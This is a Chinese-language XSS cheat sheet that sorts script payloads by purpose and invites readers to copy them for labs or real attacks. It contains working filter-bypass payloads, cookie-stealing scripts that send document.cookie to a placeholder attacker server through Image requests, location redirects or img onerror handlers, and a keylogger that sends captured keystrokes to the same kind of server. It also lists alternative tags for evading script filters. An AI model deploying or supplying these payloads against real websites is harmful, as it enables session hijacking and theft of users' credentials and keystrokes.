XSS 中 <script> 代码解析

在 XSS 攻击中，<script> 标签是最核心的攻击载体——但实战中并非只有 <script>alert(1)</script> 这一种形式。我会把 XSS 里所有 <script> 相关的代码按「用途分类」整理，附代码解释+适用场景+绕过技巧，你可以直接复制用在靶场/实战中。

一、核心原则：<script> 代码的本质

<script> 标签的作用是让浏览器执行其中的 JavaScript 代码，XSS 利用的就是：

  • 代码未经过滤输出到页面 → 浏览器执行
  • 代码依托当前页面权限（登录态、Cookie、DOM）做事
  • 实战中很少用纯 <script> 标签（易被过滤），更多是「变形/替代方案」

二、<script> 代码分类整理（按用途）

1. 基础测试类（验证漏洞是否存在）

核心目的：弹出提示框，确认 XSS 漏洞存在（CTF/靶场必用）。

代码片段 代码解释 适用场景
<script>alert(1)</script> 最基础的弹窗测试 无过滤的简单场景
<script>confirm(1)</script> 用 confirm 替代 alert 过滤了 alert 关键词
<script>prompt(1)</script> 用 prompt 替代 alert 过滤了 alert/confirm
<SCRIPT>alert(1)</SCRIPT> 大小写混合 只过滤小写 script/alert
<scr<script>ipt>alert(1)</scr<script>ipt> 双写绕过 关键词被替换为空（如 script→""）
<script>alert&#40;1&#41;</script> HTML 实体编码括号 过滤了括号 ()
<script>\u0061\u006c\u0065\u0072\u0074(1)</script> Unicode 编码 alert 过滤了 alert 关键词

2. 窃取信息类（实战核心，偷 Cookie/账号）

核心目的：把用户敏感信息（Cookie/账号/操作记录）发送到攻击者服务器，是 XSS 最主要的危害。

（1）偷 Cookie（最常用）

// 基础版：偷 Cookie 并发送到攻击者服务器
<script>
  // 编码 Cookie 避免特殊字符截断
  var cookie = encodeURIComponent(document.cookie);
  // 攻击者的接收地址（需自己搭简易 HTTP 服务器）
  var attackerUrl = "http://你的服务器IP:8080/steal?cookie=" + cookie;
  // 用 Image 标签悄悄发送（无感知，不报错）
  new Image().src = attackerUrl;
</script>

// 简化版（适合短链接场景）
<script>location.href='http://你的服务器/steal?c='+document.cookie</script>

// 绕过过滤版（无 script 标签，用 img 替代）
<img src=x onerror="new Image().src='http://你的服务器/steal?c='+document.cookie">

代码解释：

  • document.cookie：获取当前页面所有 Cookie（含登录凭证）；
  • encodeURIComponent：避免 Cookie 中的特殊字符（如 ;/=）导致链接截断；
  • new Image().src：发起 GET 请求，无需用户交互，悄悄发送数据。

<script>

  var log = "";
  document.onkeydown = function(e) {
    log += e.key; // 记录按键
    // 每按10次键发送一次数据（减少请求次数，更隐蔽）
    if (log.length % 10 === 0) {
      new Image().src = "http://你的服务器/log?keys=" + encodeURIComponent(log);
    }
  };
</script>

三、<script> 代码的替代方案（绕过 script 标签过滤）

实战中很多网站会直接过滤 <script> 标签，此时用「能执行 JS 的其他标签」替代，本质还是执行恶意代码：

替代标签代码 适用场景
<img src=x onerror=alert(1)> 过滤了 script 标签，允许 img 标签
<svg onload=alert(1)> 过滤了 img/script，允许 svg 标签
<body onload=alert(1)> 页面加载时执行，适合全局过滤场景
<iframe src="javascript:alert(1)"></iframe> 利用 iframe 的 javascript 伪协议
<a href="javascript:alert(1)">点我</a> 诱导用户点击，绕过自动执行限制

四、避坑：<script> 代码不生效的常见原因

  1. 输出位置问题：代码被输出到 <script> 标签内部 → 需闭合原有标签（如 </script><script>alert(1)</script>）；
  2. CSP 策略限制：页面开启 CSP → 禁止内联脚本/外部脚本，需绕过 CSP；
  3. HttpOnly Cookie：偷 Cookie 代码不生效 → Cookie 加了 HttpOnly，JS 无法读取；
  4. 编码转义：代码被转成 &lt;script&gt; → 需先绕过转义规则。

总结

  1. XSS 中 <script> 代码核心是利用页面权限执行恶意操作，而非仅弹窗；
  2. 实战中 <script> 标签易被过滤，优先用 img/onerror/svg/onload 等替代方案；
  3. 核心用途分 4 类：测试漏洞、窃取信息、劫持操作、页面篡改；
  4. 偷 Cookie 是最常用的实战代码，需配合攻击者的服务器接收数据。
